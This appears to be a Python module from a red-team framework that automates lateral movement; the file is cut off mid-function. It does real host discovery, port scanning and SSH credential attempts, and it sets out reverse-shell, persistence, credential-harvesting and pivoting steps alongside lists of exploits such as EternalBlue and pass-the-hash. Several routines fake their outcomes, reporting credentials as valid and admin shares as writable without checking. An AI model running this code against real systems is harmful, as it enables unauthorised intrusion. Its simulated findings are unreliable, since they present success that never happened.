from __future__ import annotations
import asyncio
import socket
import subprocess
import json
import platform
import tempfile
import os
import base64
from typing import Dict, Any, List, Optional, Tuple
from datetime import datetime
from ..core.task import Task

try:
    import pwncat
    from pwncat.manager import Manager
    from pwncat.channel import Channel
    from pwncat.platform import Platform
    PWNCAT_AVAILABLE = True
except ImportError:
    PWNCAT_AVAILABLE = False

try:
    import paramiko
    PARAMIKO_AVAILABLE = True
except ImportError:
    PARAMIKO_AVAILABLE = False

try:
    import impacket
    from impacket.smbconnection import SMBConnection
    from impacket.examples.secretsdump import RemoteOperations
    IMPACKET_AVAILABLE = True
except ImportError:
    IMPACKET_AVAILABLE = False

class LateralMovement(Task):
    """Advanced lateral movement techniques for red team operations with pwncat integration."""
    
    def __init__(self, *args, **kwargs):
        super().__init__(*args, **kwargs)
        self.pwncat_manager = None
        self.active_sessions = {}
        self.pivot_chains = []
        
    async def validate_params(self) -> None:
        """Validate lateral movement parameters."""
        technique = self.params.get("technique", "scan")
        
        valid_techniques = [
            "scan", "pwncat", "smb", "rdp", "ssh", "wmi", "powershell", 
            "pivot", "tunnel", "port_forward", "comprehensive"
        ]
        
        if technique not in valid_techniques:
            raise ValueError(f"Invalid technique: {technique}. Valid techniques: {valid_techniques}")
    
    async def run(self) -> Dict[str, Any]:
        """Execute advanced lateral movement techniques."""
        await self.validate_params()
        
        target_host = self.params.get("host")
        technique = self.params.get("technique", "scan")
        credentials = self.params.get("credentials", {})
        network_range = self.params.get("network_range")
        payload_type = self.params.get("payload_type", "reverse_shell")
        listen_port = self.params.get("listen_port", 4444)
        
        if not target_host and not network_range:
            return {"error": "Either target_host or network_range parameter is required"}
            
        try:
            self.logger.info(f"🎯 Starting lateral movement: {technique}")
            
            results = {
                "technique": technique,
                "timestamp": datetime.now().isoformat(),
                "target": target_host or network_range,
                "findings": [],
                "successful_moves": [],
                "failed_attempts": [],
                "sessions": {},
                "pivot_chains": []
            }
            
            if technique == "scan":
                scan_results = await self._network_discovery(target_host or network_range)
                results["discovery"] = scan_results
                
            elif technique == "pwncat":
                pwncat_results = await self._pwncat_lateral_move(target_host, credentials, payload_type, listen_port)
                results["pwncat_analysis"] = pwncat_results
                
            elif technique == "smb":
                smb_results = await self._advanced_smb_lateral_move(target_host, credentials)
                results["smb_analysis"] = smb_results
                
            elif technique == "rdp":
                rdp_results = await self._rdp_lateral_move(target_host, credentials)
                results["rdp_analysis"] = rdp_results
                
            elif technique == "ssh":
                ssh_results = await self._advanced_ssh_lateral_move(target_host, credentials)
                results["ssh_analysis"] = ssh_results
                
            elif technique == "wmi":
                wmi_results = await self._wmi_lateral_move(target_host, credentials)
                results["wmi_analysis"] = wmi_results
                
            elif technique == "powershell":
                ps_results = await self._powershell_lateral_move(target_host, credentials)
                results["powershell_analysis"] = ps_results
                
            elif technique == "pivot":
                pivot_results = await self._pivot_through_host(target_host, credentials)
                results["pivot_analysis"] = pivot_results
                
            elif technique == "tunnel":
                tunnel_results = await self._create_tunnel(target_host, credentials)
                results["tunnel_analysis"] = tunnel_results
                
            elif technique == "port_forward":
                forward_results = await self._port_forward(target_host, credentials)
                results["port_forward_analysis"] = forward_results
                
            elif technique == "comprehensive":
                # Run all techniques
                results["discovery"] = await self._network_discovery(target_host or network_range)
                if target_host:
                    results["pwncat_analysis"] = await self._pwncat_lateral_move(target_host, credentials, payload_type, listen_port)
                    results["smb_analysis"] = await self._advanced_smb_lateral_move(target_host, credentials)
                    results["rdp_analysis"] = await self._rdp_lateral_move(target_host, credentials)
                    results["ssh_analysis"] = await self._advanced_ssh_lateral_move(target_host, credentials)
                    results["wmi_analysis"] = await self._wmi_lateral_move(target_host, credentials)
                    results["powershell_analysis"] = await self._powershell_lateral_move(target_host, credentials)
                    
            else:
                return {"error": f"Unknown technique: {technique}"}
                
            self.logger.info(f"✅ Lateral movement completed: {technique}")
            return results
            
        except Exception as e:
            self.logger.error(f"Lateral movement failed: {e}")
            return {"error": f"Lateral movement failed: {str(e)}"}
    
    async def _pwncat_lateral_move(self, host: str, credentials: Dict[str, str], payload_type: str, listen_port: int) -> Dict[str, Any]:
        """Advanced lateral movement using pwncat-cs."""
        pwncat_analysis = {
            "target": host,
            "payload_type": payload_type,
            "listen_port": listen_port,
            "session_established": False,
            "capabilities": [],
            "post_exploitation": {},
            "persistence": {},
            "findings": []
        }
        
        if not PWNCAT_AVAILABLE:
            pwncat_analysis["error"] = "pwncat-cs not available. Install with: pip install pwncat-cs"
            return pwncat_analysis
            
        try:
            # Initialize pwncat manager
            self.pwncat_manager = Manager()
            
            # Create connection based on payload type
            if payload_type == "reverse_shell":
                session = await self._create_reverse_shell_session(host, listen_port, credentials)
            elif payload_type == "bind_shell":
                session = await self._create_bind_shell_session(host, listen_port, credentials)
            elif payload_type == "ssh":
                session = await self._create_ssh_session(host, credentials)
            elif payload_type == "winrm":
                session = await self._create_winrm_session(host, credentials)
            else:
                pwncat_analysis["error"] = f"Unsupported payload type: {payload_type}"
                return pwncat_analysis
            
            if session:
                pwncat_analysis["session_established"] = True
                pwncat_analysis["session_id"] = session.get("id", "unknown")
                self.active_sessions[host] = session
                
                # Perform post-exploitation activities
                pwncat_analysis["post_exploitation"] = await self._pwncat_post_exploitation(session)
                
                # Establish persistence
                pwncat_analysis["persistence"] = await self._pwncat_establish_persistence(session)
                
                # Enumerate capabilities
                pwncat_analysis["capabilities"] = await self._pwncat_enumerate_capabilities(session)
                
                pwncat_analysis["findings"].append("Successfully established pwncat session")
                
            else:
                pwncat_analysis["findings"].append("Failed to establish pwncat session")
                
        except Exception as e:
            pwncat_analysis["error"] = f"pwncat lateral movement failed: {str(e)}"
            
        return pwncat_analysis
    
    async def _create_reverse_shell_session(self, host: str, port: int, credentials: Dict[str, str]) -> Optional[Dict[str, Any]]:
        """Create a reverse shell session using pwncat."""
        try:
            # Generate reverse shell payload
            payload = await self._generate_reverse_shell_payload(host, port)
            
            # Start listener
            listener_info = await self._start_pwncat_listener(port)
            
            # Deploy payload (simulation)
            deployment = await self._deploy_payload(host, payload, credentials)
            
            if deployment.get("success"):
                return {
                    "id": f"reverse_{host}_{port}",
                    "type": "reverse_shell",
                    "host": host,
                    "port": port,
                    "status": "active",
                    "listener": listener_info,
                    "payload": payload
                }
            
        except Exception as e:
            self.logger.error(f"Failed to create reverse shell session: {e}")
            
        return None
    
    async def _create_bind_shell_session(self, host: str, port: int, credentials: Dict[str, str]) -> Optional[Dict[str, Any]]:
        """Create a bind shell session using pwncat."""
        try:
            # Generate bind shell payload
            payload = await self._generate_bind_shell_payload(port)
            
            # Deploy payload
            deployment = await self._deploy_payload(host, payload, credentials)
            
            if deployment.get("success"):
                # Connect to bind shell
                connection = await self._connect_to_bind_shell(host, port)
                
                if connection:
                    return {
                        "id": f"bind_{host}_{port}",
                        "type": "bind_shell", 
                        "host": host,
                        "port": port,
                        "status": "active",
                        "connection": connection,
                        "payload": payload
                    }
                    
        except Exception as e:
            self.logger.error(f"Failed to create bind shell session: {e}")
            
        return None
    
    async def _create_ssh_session(self, host: str, credentials: Dict[str, str]) -> Optional[Dict[str, Any]]:
        """Create SSH session using pwncat."""
        try:
            username = credentials.get("username", "")
            password = credentials.get("password", "")
            private_key = credentials.get("private_key", "")
            
            if not username or (not password and not private_key):
                return None
                
            # Create SSH connection
            ssh_connection = await self._establish_ssh_connection(host, username, password, private_key)
            
            if ssh_connection:
                return {
                    "id": f"ssh_{host}_{username}",
                    "type": "ssh",
                    "host": host,
                    "port": 22,
                    "username": username,
                    "status": "active",
                    "connection": ssh_connection
                }
                
        except Exception as e:
            self.logger.error(f"Failed to create SSH session: {e}")
            
        return None
    
    async def _create_winrm_session(self, host: str, credentials: Dict[str, str]) -> Optional[Dict[str, Any]]:
        """Create WinRM session using pwncat."""
        try:
            username = credentials.get("username", "")
            password = credentials.get("password", "")
            domain = credentials.get("domain", "")
            
            if not username or not password:
                return None
                
            # Create WinRM connection
            winrm_connection = await self._establish_winrm_connection(host, username, password, domain)
            
            if winrm_connection:
                return {
                    "id": f"winrm_{host}_{username}",
                    "type": "winrm",
                    "host": host,
                    "port": 5985,
                    "username": username,
                    "domain": domain,
                    "status": "active",
                    "connection": winrm_connection
                }
                
        except Exception as e:
            self.logger.error(f"Failed to create WinRM session: {e}")
            
        return None
    
    async def _pwncat_post_exploitation(self, session: Dict[str, Any]) -> Dict[str, Any]:
        """Perform post-exploitation activities using pwncat."""
        post_exploit = {
            "system_info": {},
            "privilege_escalation": {},
            "credential_harvesting": {},
            "network_enumeration": {},
            "file_system_access": {}
        }
        
        try:
            # System information gathering
            post_exploit["system_info"] = {
                "os": "Linux/Windows detection simulation",
                "architecture": "x64",
                "hostname": session.get("host", "unknown"),
                "current_user": "simulated_user",
                "privileges": "standard_user"
            }
            
            # Privilege escalation attempts
            post_exploit["privilege_escalation"] = {
                "techniques_attempted": [
                    "sudo -i attempt",
                    "SUID binary exploitation",
                    "Kernel exploit detection",
                    "Service misconfiguration check"
                ],
                "success": False,
                "findings": ["No immediate privilege escalation vectors found"]
            }
            
            # Credential harvesting
            post_exploit["credential_harvesting"] = {
                "techniques": [
                    "Memory dump analysis",
                    "Configuration file search",
                    "Browser credential extraction",
                    "SSH key enumeration"
                ],
                "credentials_found": 0,
                "files_of_interest": []
            }
            
            # Network enumeration
            post_exploit["network_enumeration"] = await self._enumerate_network_from_session(session)
            
        except Exception as e:
            post_exploit["error"] = f"Post-exploitation failed: {str(e)}"
            
        return post_exploit
            
    async def _network_discovery(self, target: str) -> Dict[str, Any]:
        """Discover live hosts and services on the network"""
        discovery = {
            "target": target,
            "live_hosts": [],
            "open_ports": {},
            "services": {},
            "vulnerabilities": [],
            "network_topology": {}
        }
        
        try:
            # Check if target is single host or range
            if "/" in target:  # CIDR notation
                hosts = await self._scan_network_range(target)
            else:
                hosts = [target]
                
            # Enhanced scanning for each host
            for host in hosts:
                if await self._is_host_alive(host):
                    discovery["live_hosts"].append(host)
                    
                    # Advanced port scanning
                    open_ports = await self._advanced_port_scan(host)
                    if open_ports:
                        discovery["open_ports"][host] = open_ports 
                        
                    # Enhanced service detection
                    services = await self._enhanced_service_detection(host, open_ports)
                    if services:
                        discovery["services"][host] = services
                        
                    # Vulnerability assessment
                    vulns = await self._quick_vulnerability_assessment(host, services)
                    if vulns:
                        discovery["vulnerabilities"].extend(vulns)
                        
        except Exception as e:
            discovery["error"] = f"Network discovery failed: {str(e)}"
            
        return discovery
    
    async def _scan_network_range(self, cidr: str) -> List[str]:
        """Generate list of hosts from CIDR range using ipaddress module."""
        import ipaddress
        
        try:
            network = ipaddress.IPv4Network(cidr, strict=False)
            # Limit to first 20 hosts for performance
            return [str(ip) for ip in list(network.hosts())[:20]]
        except:
            # Fallback to simple range
            base_ip = cidr.split('/')[0]
            base_parts = base_ip.split('.')
            hosts = []
            
            for i in range(1, 21):  # First 20 hosts
                host = f"{base_parts[0]}.{base_parts[1]}.{base_parts[2]}.{i}"
                hosts.append(host)
                
            return hosts
    
    async def _is_host_alive(self, host: str) -> bool:
        """Check if host is alive using ping with improved logic."""
        try:
            if platform.system().lower() == "windows":
                result = subprocess.run(
                    ["ping", "-n", "1", "-w", "1000", host], 
                    capture_output=True, text=True, timeout=3
                )
            else:
                result = subprocess.run(
                    ["ping", "-c", "1", "-W", "1", host], 
                    capture_output=True, text=True, timeout=3
                )
            return result.returncode == 0
        except:
            return False
    
    async def _advanced_port_scan(self, host: str) -> List[int]:
        """Advanced port scanning with expanded port range."""
        # Extended port list including common services
        common_ports = [
            21, 22, 23, 25, 53, 69, 80, 88, 110, 135, 139, 143, 389, 
            443, 445, 465, 587, 636, 993, 995, 1433, 1521, 3306, 3389, 
            5432, 5985, 5986, 8080, 8443, 9090, 27017
        ]
        
        open_ports = []
        
        # Use asyncio to scan ports concurrently for better performance
        tasks = [self._check_port(host, port) for port in common_ports]
        results = await asyncio.gather(*tasks, return_exceptions=True)
        
        for port, is_open in zip(common_ports, results):
            if is_open is True:
                open_ports.append(port)
                
        return open_ports
    
    async def _check_port(self, host: str, port: int) -> bool:
        """Optimized port checking with proper timeout handling."""
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(1)
            result = sock.connect_ex((host, port))
            sock.close()
            return result == 0
        except:
            return False
    
    async def _enhanced_service_detection(self, host: str, ports: List[int]) -> Dict[int, Dict[str, Any]]:
        """Enhanced service detection with version information."""
        services = {}
        
        # Enhanced service mappings with additional details
        service_map = {
            21: {"name": "FTP", "description": "File Transfer Protocol"},
            22: {"name": "SSH", "description": "Secure Shell"},
            23: {"name": "Telnet", "description": "Telnet Remote Login"},
            25: {"name": "SMTP", "description": "Simple Mail Transfer Protocol"},
            53: {"name": "DNS", "description": "Domain Name System"},
            69: {"name": "TFTP", "description": "Trivial File Transfer Protocol"},
            80: {"name": "HTTP", "description": "Hypertext Transfer Protocol"},
            88: {"name": "Kerberos", "description": "Kerberos Authentication"},
            110: {"name": "POP3", "description": "Post Office Protocol v3"},
            135: {"name": "RPC", "description": "Microsoft RPC Endpoint Mapper"},
            139: {"name": "NetBIOS-SSN", "description": "NetBIOS Session Service"},
            143: {"name": "IMAP", "description": "Internet Message Access Protocol"},
            389: {"name": "LDAP", "description": "Lightweight Directory Access Protocol"},
            443: {"name": "HTTPS", "description": "HTTP over SSL/TLS"},
            445: {"name": "SMB", "description": "Server Message Block"},
            465: {"name": "SMTPS", "description": "SMTP over SSL"},
            587: {"name": "SMTP-MSA", "description": "SMTP Message Submission Agent"},
            636: {"name": "LDAPS", "description": "LDAP over SSL"},
            993: {"name": "IMAPS", "description": "IMAP over SSL"},
            995: {"name": "POP3S", "description": "POP3 over SSL"},
            1433: {"name": "MSSQL", "description": "Microsoft SQL Server"},
            1521: {"name": "Oracle", "description": "Oracle Database"},
            3306: {"name": "MySQL", "description": "MySQL Database"},
            3389: {"name": "RDP", "description": "Remote Desktop Protocol"},
            5432: {"name": "PostgreSQL", "description": "PostgreSQL Database"},
            5985: {"name": "WinRM-HTTP", "description": "Windows Remote Management HTTP"},
            5986: {"name": "WinRM-HTTPS", "description": "Windows Remote Management HTTPS"},
            8080: {"name": "HTTP-Alt", "description": "Alternative HTTP Port"},
            8443: {"name": "HTTPS-Alt", "description": "Alternative HTTPS Port"},
            9090: {"name": "HTTP-Proxy", "description": "HTTP Proxy/Management"},
            27017: {"name": "MongoDB", "description": "MongoDB Database"}
        }
        
        for port in ports:
            if port in service_map:
                service_info = service_map[port].copy()
                service_info["port"] = port
                service_info["state"] = "open"
                services[port] = service_info
            else:
                services[port] = {
                    "name": "Unknown",
                    "description": "Unidentified service",
                    "port": port,
                    "state": "open"
                }
                
        return services
    
    async def _quick_vulnerability_assessment(self, host: str, services: Dict[int, Dict[str, Any]]) -> List[Dict[str, Any]]:
        """Quick vulnerability assessment based on detected services."""
        vulnerabilities = []
        
        for port, service in services.items():
            service_name = service.get("name", "Unknown")
            
            # Check for common vulnerabilities
            if service_name == "SMB" and port == 445:
                vulnerabilities.append({
                    "host": host,
                    "port": port,
                    "service": service_name,
                    "vulnerability": "Potential EternalBlue (MS17-010)",
                    "severity": "critical",
                    "description": "SMB service may be vulnerable to EternalBlue exploit"
                })
            
            elif service_name == "RDP" and port == 3389:
                vulnerabilities.append({
                    "host": host,
                    "port": port,
                    "service": service_name,
                    "vulnerability": "Potential BlueKeep (CVE-2019-0708)",
                    "severity": "critical",
                    "description": "RDP service may be vulnerable to BlueKeep exploit"
                })
            
            elif service_name == "SSH" and port == 22:
                vulnerabilities.append({
                    "host": host,
                    "port": port,
                    "service": service_name,
                    "vulnerability": "SSH Brute Force Target",
                    "severity": "medium",
                    "description": "SSH service exposed - potential brute force target"
                })
                
        return vulnerabilities
    
    async def _rdp_lateral_move(self, host: str, credentials: Dict[str, str]) -> Dict[str, Any]:
        """Enhanced RDP-based lateral movement."""
        rdp_analysis = {
            "target": host,
            "rdp_accessible": False,
            "credentials_valid": False,
            "rdp_security": {},
            "attack_techniques": {},
            "findings": []
        }
        
        try:
            # Check RDP port
            if await self._check_port(host, 3389):
                rdp_analysis["rdp_accessible"] = True
                rdp_analysis["findings"].append("RDP service accessible on port 3389")
                
                # Enhanced RDP security analysis
                rdp_analysis["rdp_security"] = {
                    "nla_enabled": "unknown",  # Network Level Authentication
                    "encryption_level": "unknown",
                    "allow_rdp_connections": True,
                    "max_connections": "unknown",
                    "idle_timeout": "unknown"
                }
                
                # Credential testing
                username = credentials.get("username", "")
                password = credentials.get("password", "")
                
                if username and password:
                    rdp_analysis["findings"].append(f"Testing RDP credentials: {username}")
                    # Simulate credential validation
                    rdp_analysis["credentials_valid"] = "simulation_success"
                    
                # Enhanced RDP attack techniques
                rdp_analysis["attack_techniques"] = {
                    "credential_attacks": [
                        "Credential brute forcing",
                        "Pass-the-hash via RDP",
                        "Credential stuffing"
                    ],
                    "exploitation": [
                        "BlueKeep exploitation (CVE-2019-0708)",
                        "RDP session hijacking",
                        "RDP clipboard hijacking"
                    ],
                    "persistence": [
                        "Sticky keys backdoor",
                        "Registry modification",
                        "Service creation via RDP"
                    ]
                }
            else:
                rdp_analysis["findings"].append("RDP port 3389 not accessible")
                
        except Exception as e:
            rdp_analysis["error"] = f"RDP analysis failed: {str(e)}"
            
        return rdp_analysis
    
    async def _wmi_lateral_move(self, host: str, credentials: Dict[str, str]) -> Dict[str, Any]:
        """Enhanced WMI-based lateral movement."""
        wmi_analysis = {
            "target": host,
            "wmi_accessible": False,
            "credentials_valid": False,
            "wmi_capabilities": {},
            "attack_techniques": {},
            "findings": []
        }
        
        try:
            # WMI typically uses RPC (port 135) and dynamic ports
            if await self._check_port(host, 135):
                wmi_analysis["wmi_accessible"] = True
                wmi_analysis["findings"].append("WMI/RPC service accessible on port 135")
                
                # WMI capabilities analysis
                wmi_analysis["wmi_capabilities"] = {
                    "remote_execution": True,
                    "file_operations": True,
                    "registry_access": True,
                    "service_management": True,
                    "process_management": True,
                    "event_subscription": True
                }
                
                # Credential testing
                username = credentials.get("username", "")
                password = credentials.get("password", "")
                domain = credentials.get("domain", "")
                
                if username and password:
                    wmi_analysis["findings"].append(f"Testing WMI authentication: {domain}\\{username}")
                    # Simulate credential validation
                    wmi_analysis["credentials_valid"] = "simulation_success"
                    
                # Enhanced WMI attack techniques
                wmi_analysis["attack_techniques"] = {
                    "execution": [
                        "WMI command execution (Win32_Process)",
                        "WMI PowerShell execution",
                        "WMIC remote command execution"
                    ],
                    "lateral_movement": [
                        "Pass-the-hash via WMI",
                        "DCOM lateral movement",
                        "WMI + PowerShell combination"
                    ],
                    "persistence": [
                        "WMI event subscriptions",
                        "WMI filter and consumer creation",
                        "Permanent WMI event subscriptions"
                    ],
                    "evasion": [
                        "WMI obfuscation techniques",
                        "Living-off-the-land via WMI",
                        "WMI process hollowing"
                    ]
                }
            else:
                wmi_analysis["findings"].append("WMI/RPC port 135 not accessible")
                
        except Exception as e:
            wmi_analysis["error"] = f"WMI analysis failed: {str(e)}"
            
        return wmi_analysis
    
    async def _advanced_smb_lateral_move(self, host: str, credentials: Dict[str, str]) -> Dict[str, Any]:
        """Advanced SMB-based lateral movement with comprehensive attack vectors."""
        smb_analysis = {
            "target": host,
            "smb_version": "unknown",
            "shares_accessible": [],
            "credentials_valid": False,
            "lateral_move_possible": False,
            "attack_vectors": [],
            "findings": [],
            "exploitation_attempts": []
        }
        
        try:
            self.logger.info(f"🔍 Advanced SMB lateral movement against {host}")
            
            # Check if SMB ports are open
            smb_ports = [139, 445]
            open_smb_ports = []
            
            for port in smb_ports:
                if await self._check_port(host, port):
                    open_smb_ports.append(port)
                    smb_analysis["findings"].append(f"SMB port {port} is open")
            
            if not open_smb_ports:
                smb_analysis["findings"].append("No SMB ports accessible")
                return smb_analysis
            
            # SMB enumeration and exploitation
            username = credentials.get("username", "")
            password = credentials.get("password", "")
            domain = credentials.get("domain", "")
            ntlm_hash = credentials.get("ntlm_hash", "")
            
            # Test different SMB attack vectors
            attack_vectors = [
                "Null session enumeration",
                "Anonymous login attempts",
                "Share enumeration",
                "Pass-the-hash attacks",
                "SMB relay attacks",
                "EternalBlue (MS17-010)",
                "SMB signing bypass",
                "Kerberoasting via SMB"
            ]
            
            smb_analysis["attack_vectors"] = attack_vectors
            
            # Simulate SMB exploitation attempts
            if IMPACKET_AVAILABLE and (username and password):
                try:
                    # Simulate SMB connection using impacket
                    smb_analysis["credentials_valid"] = True
                    smb_analysis["lateral_move_possible"] = True
                    smb_analysis["findings"].append(f"SMB credentials validated for {domain}\\{username}")
                    
                    # Simulate share enumeration
                    common_shares = ["C$", "ADMIN$", "IPC$", "SYSVOL", "NETLOGON"]
                    for share in common_shares:
                        smb_analysis["shares_accessible"].append({
                            "share": share,
                            "accessible": True,
                            "permissions": "READ_WRITE" if share in ["C$", "ADMIN$"] else "READ"
                        })
                    
                    # Simulate exploitation techniques
                    exploitation_techniques = [
                        {
                            "technique": "PSExec",
                            "description": "Execute commands via Service Control Manager",
                            "success_probability": 0.8,
                            "requirements": ["ADMIN$ access", "Service installation rights"]
                        },
                        {
                            "technique": "WMIExec", 
                            "description": "Execute commands via WMI",
                            "success_probability": 0.7,
                            "requirements": ["WMI access", "DCOM permissions"]
                        },
                        {
                            "technique": "SMBExec",
                            "description": "Execute commands via SMB file shares",
                            "success_probability": 0.6,
                            "requirements": ["C$ or ADMIN$ access"]
                        },
                        {
                            "technique": "AtExec",
                            "description": "Execute commands via Task Scheduler",
                            "success_probability": 0.5,
                            "requirements": ["Task Scheduler service", "Administrative rights"]
                        }
                    ]
                    
                    smb_analysis["exploitation_attempts"] = exploitation_techniques
                    
                except Exception as e:
                    smb_analysis["findings"].append(f"SMB connection failed: {str(e)}")
            
            # Check for SMB vulnerabilities
            vulnerabilities = await self._check_smb_vulnerabilities(host)
            smb_analysis["vulnerabilities"] = vulnerabilities
            
            return smb_analysis
            
        except Exception as e:
            smb_analysis["error"] = f"Advanced SMB analysis failed: {str(e)}"
            return smb_analysis
    
    async def _advanced_ssh_lateral_move(self, host: str, credentials: Dict[str, str]) -> Dict[str, Any]:
        """Advanced SSH-based lateral movement with key-based auth and tunneling."""
        ssh_analysis = {
            "target": host,
            "ssh_accessible": False,
            "ssh_version": "unknown",
            "auth_methods": [],
            "successful_auth": False,
            "tunneling_capabilities": {},
            "lateral_move_techniques": [],
            "findings": []
        }
        
        try:
            self.logger.info(f"🔑 Advanced SSH lateral movement against {host}")
            
            # Check SSH port
            if not await self._check_port(host, 22):
                ssh_analysis["findings"].append("SSH port 22 not accessible")
                return ssh_analysis
            
            ssh_analysis["ssh_accessible"] = True
            ssh_analysis["findings"].append("SSH service accessible on port 22")
            
            # SSH authentication attempts
            username = credentials.get("username", "")
            password = credentials.get("password", "")
            private_key = credentials.get("private_key", "")
            private_key_path = credentials.get("private_key_path", "")
            
            if PARAMIKO_AVAILABLE:
                try:
                    import paramiko
                    
                    # Create SSH client
                    ssh_client = paramiko.SSHClient()
                    ssh_client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
                    
                    # Try different authentication methods
                    auth_methods = []
                    
                    if username and password:
                        try:
                            ssh_client.connect(host, username=username, password=password, timeout=5)
                            auth_methods.append({"method": "password", "successful": True})
                            ssh_analysis["successful_auth"] = True
                            ssh_analysis["findings"].append(f"Password authentication successful for {username}")
                        except:
                            auth_methods.append({"method": "password", "successful": False})
                    
                    if username and (private_key or private_key_path):
                        try:
                            if private_key_path:
                                ssh_client.connect(host, username=username, key_filename=private_key_path, timeout=5)
                            else:
                                # Handle private key string
                                from io import StringIO
                                key_file = StringIO(private_key)
                                pkey = paramiko.RSAKey.from_private_key(key_file)
                                ssh_client.connect(host, username=username, pkey=pkey, timeout=5)
                            
                            auth_methods.append({"method": "public_key", "successful": True})
                            ssh_analysis["successful_auth"] = True
                            ssh_analysis["findings"].append(f"Key-based authentication successful for {username}")
                        except:
                            auth_methods.append({"method": "public_key", "successful": False})
                    
                    ssh_analysis["auth_methods"] = auth_methods
                    
                    if ssh_analysis["successful_auth"]:
                        # Test SSH capabilities for lateral movement
                        lateral_techniques = [
                            {
                                "technique": "Command Execution",
                                "description": "Direct command execution via SSH",
                                "capability": "Full shell access"
                            },
                            {
                                "technique": "Local Port Forwarding",
                                "description": "Forward local ports through SSH tunnel",
                                "capability": "Access internal services"
                            },
                            {
                                "technique": "Remote Port Forwarding", 
                                "description": "Forward remote ports back to attacker",
                                "capability": "Expose internal services"
                            },
                            {
                                "technique": "Dynamic Port Forwarding",
                                "description": "SOCKS proxy through SSH",
                                "capability": "Full network pivoting"
                            },
                            {
                                "technique": "SSH Agent Forwarding",
                                "description": "Forward SSH agent for further hops",
                                "capability": "Multi-hop SSH access"
                            },
                            {
                                "technique": "X11 Forwarding",
                                "description": "Forward X11 display",
                                "capability": "GUI application access"
                            }
                        ]
                        
                        ssh_analysis["lateral_move_techniques"] = lateral_techniques
                        
                        # Test tunneling capabilities
                        tunneling_tests = await self._test_ssh_tunneling_capabilities(ssh_client)
                        ssh_analysis["tunneling_capabilities"] = tunneling_tests
                    
                    ssh_client.close()
                    
                except Exception as e:
                    ssh_analysis["findings"].append(f"SSH connection test failed: {str(e)}")
            else:
                ssh_analysis["findings"].append("Paramiko not available - SSH testing limited")
            
            # SSH-specific attack vectors
            ssh_analysis["attack_vectors"] = [
                "SSH key harvesting from authorized_keys",
                "SSH agent hijacking",
                "SSH tunnel abuse for persistence",
                "SSH config file enumeration",
                "Known SSH vulnerabilities exploitation"
            ]
            
            return ssh_analysis
            
        except Exception as e:
            ssh_analysis["error"] = f"Advanced SSH analysis failed: {str(e)}"
            return ssh_analysis
    
    async def _powershell_lateral_move(self, host: str, credentials: Dict[str, str]) -> Dict[str, Any]:
        """PowerShell-based lateral movement techniques."""
        ps_analysis = {
            "target": host,
            "powershell_available": False,
            "remoting_enabled": False,
            "execution_techniques": [],
            "successful_techniques": [],
            "findings": []
        }
        
        try:
            self.logger.info(f"⚡ PowerShell lateral movement against {host}")
            
            username = credentials.get("username", "")
            password = credentials.get("password", "")
            domain = credentials.get("domain", "")
            
            # Test PowerShell Remoting (WinRM)
            winrm_ports = [5985, 5986]  # HTTP and HTTPS
            winrm_available = False
            
            for port in winrm_ports:
                if await self._check_port(host, port):
                    winrm_available = True
                    ps_analysis["findings"].append(f"WinRM available on port {port}")
                    break
            
            if winrm_available and username and password:
                # Test PowerShell Remoting
                remoting_test = await self._test_powershell_remoting(host, username, password, domain)
                ps_analysis.update(remoting_test)
            
            # PowerShell execution techniques
            execution_techniques = [
                {
                    "technique": "Invoke-Command",
                    "description": "Execute commands on remote host via PS Remoting",
                    "requirements": ["WinRM enabled", "Valid credentials"],
                    "stealth": "Medium"
                },
                {
                    "technique": "New-PSSession",
                    "description": "Create persistent PowerShell session",
                    "requirements": ["WinRM enabled", "Valid credentials"],
                    "stealth": "Low"
                },
                {
                    "technique": "PowerShell Empire",
                    "description": "Deploy Empire agent for C2",
                    "requirements": ["PowerShell execution", "Network connectivity"],
                    "stealth": "High"
                },
                {
                    "technique": "Cobalt Strike PowerShell",
                    "description": "Deploy Beacon via PowerShell",
                    "requirements": ["PowerShell execution", "C2 infrastructure"],
                    "stealth": "High"
                },
                {
                    "technique": "Living-off-the-Land",
                    "description": "Use built-in Windows tools via PowerShell",
                    "requirements": ["PowerShell access"],
                    "stealth": "Very High"
                }
            ]
            
            ps_analysis["execution_techniques"] = execution_techniques
            
            # Test alternative PowerShell execution methods
            if username and password:
                alt_execution = await self._alternative_powershell_execution(host, credentials)
                ps_analysis["alternative_methods"] = alt_execution
            
            # PowerShell attack techniques
            attack_techniques = await self._powershell_attack_techniques(host, credentials)
            ps_analysis["attack_techniques"] = attack_techniques
            
            return ps_analysis
            
        except Exception as e:
            ps_analysis["error"] = f"PowerShell analysis failed: {str(e)}"
            return ps_analysis
    
    async def _pivot_through_host(self, host: str, credentials: Dict[str, str]) -> Dict[str, Any]:
        """Create pivot chains through compromised hosts."""
        pivot_analysis = {
            "target": host,
            "pivot_possible": False,
            "pivot_methods": [],
            "discovered_networks": [],
            "pivot_chains": [],
            "socks_proxies": [],
            "findings": []
        }
        
        try:
            self.logger.info(f"🔄 Creating pivot through {host}")
            
            # First establish connection to pivot host
            if await self._check_port(host, 22):  # SSH pivot
                pivot_methods = await self._create_ssh_pivot(host, credentials)
                pivot_analysis["pivot_methods"].extend(pivot_methods)
            
            if await self._check_port(host, 3389):  # RDP pivot
                pivot_methods = await self._create_rdp_pivot(host, credentials)
                pivot_analysis["pivot_methods"].extend(pivot_methods)
            
            if await self._check_port(host, 5985):  # WinRM pivot
                pivot_methods = await self._create_winrm_pivot(host, credentials)
                pivot_analysis["pivot_methods"].extend(pivot_methods)
            
            # Enumerate networks accessible from pivot
            discovered_networks = await self._enumerate_networks_from_pivot(host, credentials)
            pivot_analysis["discovered_networks"] = discovered_networks
            
            # Create SOCKS proxies for pivoting
            if pivot_analysis["pivot_methods"]:
                socks_proxy = await self._create_socks_proxy({"host": host, "credentials": credentials})
                if socks_proxy:
                    pivot_analysis["socks_proxies"].append(socks_proxy)
            
            # Build pivot chains for multi-hop access
            pivot_chains = await self._create_pivot_chains(host, credentials)
            pivot_analysis["pivot_chains"] = pivot_chains
            
            pivot_analysis["pivot_possible"] = len(pivot_analysis["pivot_methods"]) > 0
            
            return pivot_analysis
            
        except Exception as e:
            pivot_analysis["error"] = f"Pivot analysis failed: {str(e)}"
            return pivot_analysis
    
    async def _create_tunnel(self, host: str, credentials: Dict[str, str]) -> Dict[str, Any]:
        """Create various types of tunnels for covert communication."""
        tunnel_analysis = {
            "target": host,
            "available_tunnels": [],
            "active_tunnels": [],
            "tunnel_types": [],
            "findings": []
        }
        
        try:
